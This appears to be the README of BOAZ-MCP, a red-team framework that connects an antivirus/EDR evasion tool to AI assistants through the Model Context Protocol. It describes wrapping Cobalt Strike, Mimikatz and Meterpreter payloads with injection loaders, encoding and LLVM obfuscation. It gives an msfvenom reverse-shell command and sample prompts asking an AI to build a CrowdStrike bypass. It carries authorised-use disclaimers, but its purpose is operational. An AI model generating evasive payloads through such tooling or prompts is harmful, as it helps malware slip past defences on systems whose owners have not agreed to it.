<div align="center">
  <img src="BOAZ-MCP.png" alt="BOAZ MCP Logo" width="300">
</div>

**BOAZ (Bypass, Obfuscate, Adapt, Zero-trace)** - MCP Integration for AI-Assisted Red Team Operations

![License](https://img.shields.io/badge/license-MIT-blue.svg)
![Python](https://img.shields.io/badge/Python-3.8+-blue.svg)
![Platform](https://img.shields.io/badge/platform-Linux-lightgrey.svg)

## What is BOAZ-MCP?

BOAZ-MCP is an AI-powered evasion framework for authorised red team operations. It wraps the [BOAZ framework](https://github.com/thomasxm/Boaz_beta) with a Model Context Protocol (MCP) server, enabling AI assistants to generate sophisticated payloads through natural language conversations.

**Key Capabilities:**
- 77+ process injection loaders with advanced evasion techniques
- LLVM-based obfuscation (Pluto, Akira) with control flow flattening
- 12 encoding schemes (AES, ChaCha20, UUID, XOR, etc.)
- Direct syscalls, API unhooking, ETW patching, sleep obfuscation
- Anti-emulation, entropy reduction, binary hardening

Simply describe your requirements to an AI assistant, and BOAZ-MCP handles the technical complexity of payload generation, obfuscation, and evasion configuration.

> **WARNING**: For authorised security testing only. Obtain written permission before use. Users are responsible for legal compliance.

## What BOAZ Does (Important!)

**BOAZ is NOT a malware generator - it's a malware wrapper and obfuscator.**

### How It Works:

1. **You provide an existing payload** (INPUT):
   - Cobalt Strike beacon.exe
   - Mimikatz.exe
   - Meterpreter executable
   - Sliver implant
   - Any Windows PE file you want to make evasive

2. **BOAZ wraps and obfuscates it**:
   - Converts your payload to shellcode
   - Encodes it (AES, UUID, etc.)
   - Creates a new loader with evasion techniques
   - Applies LLVM obfuscation
   - Adds anti-analysis features

3. **Output: Evasive version** (OUTPUT):
   - Your original payload, now harder to detect
   - Wrapped in advanced evasion techniques
   - Ready for testing

### What You Need Before Using BOAZ:

**Required:**
- Your own malicious payload (beacon.exe, mimikatz.exe, meterpreter, etc.)
- Or use the included `notepad.exe` for testing the framework

**Generating Test Payloads:**
```bash
# Meterpreter (using Metasploit)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.1 LPORT=443 -f exe -o payload.exe

# Cobalt Strike (using CS teamserver)
# Generate beacon via Cobalt Strike GUI

# Mimikatz
# Download from https://github.com/gentilkiwi/mimikatz/releases
```

**Testing Without Malware:**
BOAZ includes `notepad.exe` for testing. Use this to verify BOAZ works before using real payloads:
```bash
python3 Boaz.py -f notepad.exe -o output/test.exe -l 16 -e uuid
```

## Setup

### Quick Start (Docker - Recommended)

**No compilation needed! Get started in 5 minutes.**

**Option 1: Automated Setup (Easiest)**
```bash
git clone https://github.com/Yenn503/BOAZ-MCP.git
cd BOAZ-MCP
chmod +x quickstart.sh
./quickstart.sh
```

**Option 2: Manual Setup**
```bash
# 1. Clone repository
git clone https://github.com/Yenn503/BOAZ-MCP.git
cd BOAZ-MCP

# 2. Pull Docker image (includes pre-compiled LLVM obfuscators)
docker pull mmttxx20/boaz-builder:latest

# 3. Configure for your AI client (Claude, Continue.dev, Cursor, etc.)
chmod +x install/configure_mcp.sh
./install/configure_mcp.sh

# 4. Restart your AI client
# Done! BOAZ tools will appear in your MCP client
```

**See [docs/DOCKER_QUICKSTART.md](docs/DOCKER_QUICKSTART.md) for detailed Docker setup guide.**
**See [docker/README.md](docker/README.md) for Docker-specific documentation.**

### Manual Installation (Advanced Users)

If you prefer local installation or need to modify BOAZ code:

**Prerequisites:**
- Linux (Debian/Kali preferred)
- Python 3.8+, Wine, CMake, Git, GCC, G++, MingW, LLVM, NASM
- 8GB+ RAM for LLVM compilation
- 60-90 minutes for full installation

**Installation:**
```bash
git clone https://github.com/Yenn503/BOAZ-MCP.git
cd BOAZ-MCP
chmod +x install/setup.sh
./install/setup.sh
```

**Note:** This compiles Akira and Pluto LLVM obfuscators from source (~30-60 mins). For faster setup, use Docker method above.
**See [install/README.md](install/README.md) for detailed installation documentation.**

### Supported AI Clients

BOAZ MCP works with ALL MCP-compatible clients:

- **Claude Desktop** - Full support
- **Continue.dev** (VS Code) - Full support
- **Cursor IDE** - Full support
- **VS Code** (with MCP extension) - Full support
- **Roo Code** - Full support
- **Any MCP-compatible client** - Should work

Use `install/configure_mcp.sh` to automatically configure your client.

### Manual Configuration

If the auto-configurator doesn't work, use these examples. Replace `$HOME/BOAZ-MCP` with your actual installation path.

---

#### **Claude Desktop**

**Config File Location:**
- Linux: `~/.config/Claude/claude_desktop_config.json`
- macOS: `~/Library/Application Support/Claude/claude_desktop_config.json`

**Docker Mode:**
```json
{
  "mcpServers": {
    "boaz": {
      "command": "docker",
      "args": [
        "run", "--rm", "-i",
        "-v", "$HOME:/host_home:ro",
        "-v", "$HOME/BOAZ-MCP/BOAZ_beta:/boaz/BOAZ_beta:ro",
        "-v", "$HOME/BOAZ-MCP/payloads:/boaz/payloads:ro",
        "-v", "$HOME/BOAZ-MCP/output:/boaz/output",
        "-v", "$HOME/BOAZ-MCP/boaz_mcp:/boaz/boaz_mcp:ro",
        "mmttxx20/boaz-builder",
        "python3", "/boaz/boaz_mcp/server.py"
      ],
      "env": {
        "BOAZ_PATH": "/boaz/BOAZ_beta",
        "BOAZ_OUTPUT_DIR": "/boaz/output"
      }
    }
  }
}
```

**Local Mode:**
```json
{
  "mcpServers": {
    "boaz": {
      "command": "python3",
      "args": [
        "$HOME/BOAZ-MCP/boaz_mcp/server.py"
      ],
      "env": {
        "BOAZ_PATH": "$HOME/BOAZ-MCP/BOAZ_beta",
        "BOAZ_OUTPUT_DIR": "$HOME/BOAZ-MCP/BOAZ_beta/output"
      }
    }
  }
}
```

---

#### **Continue.dev (VS Code)**

**Config File Location:** `~/.continue/config.json`

**Docker Mode:**
```json
{
  "mcpServers": {
    "boaz": {
      "command": "docker",
      "args": [
        "run", "--rm", "-i",
        "-v", "$HOME:/host_home:ro",
        "-v", "$HOME/BOAZ-MCP/BOAZ_beta:/boaz/BOAZ_beta:ro",
        "-v", "$HOME/BOAZ-MCP/payloads:/boaz/payloads:ro",
        "-v", "$HOME/BOAZ-MCP/output:/boaz/output",
        "-v", "$HOME/BOAZ-MCP/boaz_mcp:/boaz/boaz_mcp:ro",
        "mmttxx20/boaz-builder",
        "python3", "/boaz/boaz_mcp/server.py"
      ],
      "env": {
        "BOAZ_PATH": "/boaz/BOAZ_beta",
        "BOAZ_OUTPUT_DIR": "/boaz/output"
      }
    }
  }
}
```

**Local Mode:**
```json
{
  "mcpServers": {
    "boaz": {
      "command": "python3",
      "args": [
        "$HOME/BOAZ-MCP/boaz_mcp/server.py"
      ],
      "env": {
        "BOAZ_PATH": "$HOME/BOAZ-MCP/BOAZ_beta",
        "BOAZ_OUTPUT_DIR": "$HOME/BOAZ-MCP/BOAZ_beta/output"
      }
    }
  }
}
```

---

#### **Cursor IDE**

**Config File Location:** `~/.cursor/mcp_settings.json`

**Docker Mode:**
```json
{
  "mcpServers": {
    "boaz": {
      "command": "docker",
      "args": [
        "run", "--rm", "-i",
        "-v", "$HOME:/host_home:ro",
        "-v", "$HOME/BOAZ-MCP/BOAZ_beta:/boaz/BOAZ_beta:ro",
        "-v", "$HOME/BOAZ-MCP/payloads:/boaz/payloads:ro",
        "-v", "$HOME/BOAZ-MCP/output:/boaz/output",
        "-v", "$HOME/BOAZ-MCP/boaz_mcp:/boaz/boaz_mcp:ro",
        "mmttxx20/boaz-builder",
        "python3", "/boaz/boaz_mcp/server.py"
      ],
      "env": {
        "BOAZ_PATH": "/boaz/BOAZ_beta",
        "BOAZ_OUTPUT_DIR": "/boaz/output"
      }
    }
  }
}
```

**Local Mode:**
```json
{
  "mcpServers": {
    "boaz": {
      "command": "python3",
      "args": [
        "$HOME/BOAZ-MCP/boaz_mcp/server.py"
      ],
      "env": {
        "BOAZ_PATH": "$HOME/BOAZ-MCP/BOAZ_beta",
        "BOAZ_OUTPUT_DIR": "$HOME/BOAZ-MCP/BOAZ_beta/output"
      }
    }
  }
}
```

---

#### **VS Code (Generic MCP)**

**Config File Location:** `~/.vscode/mcp.json`

**Docker Mode:**
```json
{
  "mcpServers": {
    "boaz": {
      "command": "docker",
      "args": [
        "run", "--rm", "-i",
        "-v", "$HOME:/host_home:ro",
        "-v", "$HOME/BOAZ-MCP/BOAZ_beta:/boaz/BOAZ_beta:ro",
        "-v", "$HOME/BOAZ-MCP/payloads:/boaz/payloads:ro",
        "-v", "$HOME/BOAZ-MCP/output:/boaz/output",
        "-v", "$HOME/BOAZ-MCP/boaz_mcp:/boaz/boaz_mcp:ro",
        "mmttxx20/boaz-builder",
        "python3", "/boaz/boaz_mcp/server.py"
      ],
      "env": {
        "BOAZ_PATH": "/boaz/BOAZ_beta",
        "BOAZ_OUTPUT_DIR": "/boaz/output"
      }
    }
  }
}
```

**Local Mode:**
```json
{
  "mcpServers": {
    "boaz": {
      "command": "python3",
      "args": [
        "$HOME/BOAZ-MCP/boaz_mcp/server.py"
      ],
      "env": {
        "BOAZ_PATH": "$HOME/BOAZ-MCP/BOAZ_beta",
        "BOAZ_OUTPUT_DIR": "$HOME/BOAZ-MCP/BOAZ_beta/output"
      }
    }
  }
}
```

---

**Note:** All configurations above use `$HOME/BOAZ-MCP` as the installation path. Replace this with your actual installation path (e.g., `/home/username/BOAZ-MCP`).

## Usage

BOAZ-MCP is designed for natural language interaction. Simply describe what you need:

### Basic Payload Generation
```
"I have beacon.exe from my Cobalt Strike server.
Generate a basic evasive version."
```
AI wraps your beacon.exe with loader 16 + UUID encoding.

### Advanced Obfuscation
```
"I have mimikatz.exe. Create a version with LLVM obfuscation
for maximum stealth."
```
AI wraps your mimikatz.exe with Akira compiler + advanced obfuscation.

### EDR Evasion
```
"I'm targeting CrowdStrike with my meterpreter payload.
Generate an EDR bypass with memory guard loaders, AES encoding,
ETW patching, and anti-emulation checks."
```
AI wraps your meterpreter with loader 51 + AES + full evasion suite.

### Testing BOAZ (No Real Malware)
```
"I want to test BOAZ. Use the included notepad.exe
to verify it works."
```
AI wraps the safe notepad.exe to verify BOAZ is working properly.

### Entropy Optimisation
```
"My wrapped payload has high entropy and keeps getting flagged.
Can you help optimise it?"
```
AI analyses and regenerates with entropy reduction.

### Loader Discovery
```
"Show me all threadless injection loaders"
```
AI lists available loaders by category.

**Remember:** You must provide your own malicious payload as input (beacon.exe, mimikatz.exe, etc.), or use the included `notepad.exe` for testing.

## Available MCP Tools

- **generate_payload** - Generate evasive payloads from PE files
- **list_loaders** - Display available process injection loaders
- **list_encoders** - Show supported encoding schemes
- **analyze_binary** - Analyse binary characteristics and entropy
- **validate_options** - Validate BOAZ configuration parameters

## Documentation

- **[docs/AI_AGENTS.md](docs/AI_AGENTS.md)** - Complete guide for AI assistants
- **[docs/INSTALL.md](docs/INSTALL.md)** - Detailed installation instructions
- **[docs/USAGE.md](docs/USAGE.md)** - Usage examples and workflows
- **[docs/API.md](docs/API.md)** - MCP API reference and loader documentation
- **[docs/DOCKER_QUICKSTART.md](docs/DOCKER_QUICKSTART.md)** - Docker quick start guide
- **[examples/mcp_config.json](examples/mcp_config.json)** - Configuration examples
- **[docker/README.md](docker/README.md)** - Docker setup documentation
- **[install/README.md](install/README.md)** - Installation scripts documentation
- **[tests/README.md](tests/README.md)** - Test suite documentation

## Security

**Authorised Use Only:**
- Obtain written permission before testing
- Use only in isolated environments or with explicit authorisation
- Comply with all applicable laws and regulations
- Document all testing activities

**Operational Security:**
- Never use on production systems without authorisation
- Maintain chain of custody for generated payloads
- Implement proper access controls

## License & Disclaimer

Licensed under MIT. THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND. Users assume all responsibility for ensuring their activities are legal and authorised.

## Contributing

Contributions welcome! Fork the repository, create a feature branch, and submit a pull request.

**Repository**: https://github.com/Yenn503/BOAZ-MCP
**Issues**: https://github.com/Yenn503/BOAZ-MCP/issues
**Original BOAZ**: https://github.com/thomasxm/Boaz_beta
